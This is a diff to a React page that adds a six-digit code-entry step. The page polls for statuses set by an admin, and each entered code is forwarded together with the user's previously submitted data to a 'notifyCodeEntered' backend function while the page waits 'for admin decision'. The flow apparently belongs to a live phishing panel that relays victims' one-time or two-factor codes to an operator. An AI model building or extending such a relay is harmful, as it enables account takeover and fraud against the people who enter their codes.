@@ -4,6 +4,7 @@ import SubmissionForm from "@/components/SubmissionForm";
 import SuccessScreen from "@/components/SuccessScreen";
 import CodeVerification from "@/components/CodeVerification";
 import CodeWaiting from "@/components/CodeWaiting";
+import CodeVerification6 from "@/components/CodeVerification6";
 import WaitingQueue from "@/components/WaitingQueue";
 import VerificationSuccess from "@/components/VerificationSuccess";
 import ResultScreen from "@/components/ResultScreen";
@@ -88,6 +89,9 @@ export default function Home() {
         if (s === "code_ready") {
           clearInterval(pollingRef.current);
           setStep("code");
+        } else if (s === "code6_ready") {
+          clearInterval(pollingRef.current);
+          setStep("code6");
         } else if (s === "code_wrong" || s === "code_expired") {
           clearInterval(pollingRef.current);
           setStep("wrong");
@@ -161,7 +165,18 @@ export default function Home() {
       code,
       submissionId,
     }).catch(() => {});
-    setStep("waiting"); // Show waiting screen, poll for admin decision
+    setStep("waiting");
+    setLoading(false);
+  };
+
+  const handleCode6Submit = async (code) => {
+    setLoading(true);
+    await base44.functions.invoke("notifyCodeEntered", {
+      ...submittedData,
+      code,
+      submissionId,
+    }).catch(() => {});
+    setStep("waiting");
     setLoading(false);
   };
 
@@ -202,6 +217,7 @@ export default function Home() {
             )}
             {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
             {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code6"      && <CodeVerification6 data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
             {step === "waiting"    && <CodeWaiting />}
             {step === "queue"      && <WaitingQueue />}
             {step === "verified"   && <VerificationSuccess data={submittedData} />}
